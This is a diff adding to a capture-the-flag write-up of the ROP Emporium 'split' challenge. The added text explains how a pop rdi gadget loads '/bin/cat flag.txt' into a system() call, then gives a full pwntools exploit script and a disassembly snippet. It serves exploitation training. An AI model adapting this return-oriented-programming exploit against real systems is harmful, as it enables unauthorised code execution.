@@ -154,3 +154,66 @@ Using these commands we find out that there are calls to `system` and that we ha
 
 In order to parse `/bin/cat flag.txt` to the `system()` function as an argument, we need to load the string into the `rdi` register, as per the calling convention for x86_64. This can be done with a `pop rdi; ret` gadget, and fortunately we have one at `0x4007c3`. Also noting that we have a `ret` gadget for stack alignment at `0x40053e`.
 
+So in order to load `/bin/cat flag.txt` in the `rdi` register, we need to put the address of this value onto the stack, so it is loaded when `pop rdi; ret` is called. Our chain should look something like this:
+
+```python
+payload = [
+    offset,
+    pop_rdi,
+    bash_string_address,
+    system_call
+]
+```
+
+And our actual python exploit code: 
+
+```python
+from pwn import *
+
+chall = "./split"
+
+context.binary = chall
+context.bits = 64
+
+pop_rdi = p64(0x4007c3)
+stack_alignment = p64(0x40053e)
+bash_string = p64(0x00601060)
+system_call = p64(0x000000000040074b)
+
+offset = b'A' * 40
+
+# Put the bin/sh address on the stack, pop it into RDI, then call system with the string in RDI to supply it as the argument
+
+payload = [
+    offset,
+    pop_rdi,
+    bash_string,
+    system_call
+]
+
+payload = b"".join(payload)
+
+p = process([chall])
+
+p.recvuntil(b'>')
+
+p.sendline(payload)
+p.interactive()
+```
+
+We have to go to our `pop rdi; ret` gadget first by manipulating the instruction pointer (basically popping `rip`) to go to the address of `pop rdi; ret`. When `pop rdi` gets executed the `RSP` (stack pointer) is going to be pointing to the address of the `/bin/cat/ flag.txt` address and loading it into `RDI`. Then we call system! One thing which i forgot in this challenge is that we should find a function where system is called, and then use the address of the call instruction instead of the acutal address of system in `@plt`. So to call `system` we find the call in `usefulFunction` and use the address of the `call 0x400560 <system@plt>` which is `0x000000000040074b`.
+
+```assembler
+   0x0000000000400742 <+0>: push   rbp
+   0x0000000000400743 <+1>: mov    rbp,rsp
+   0x0000000000400746 <+4>: mov    edi,0x40084a
+   0x000000000040074b <+9>: call   0x400560 <system@plt>
+   0x0000000000400750 <+14>: nop
+   0x0000000000400751 <+15>: pop    rbp
+   0x0000000000400752 <+16>: ret   
+```
+
+This solves split!
+
+## callme
+
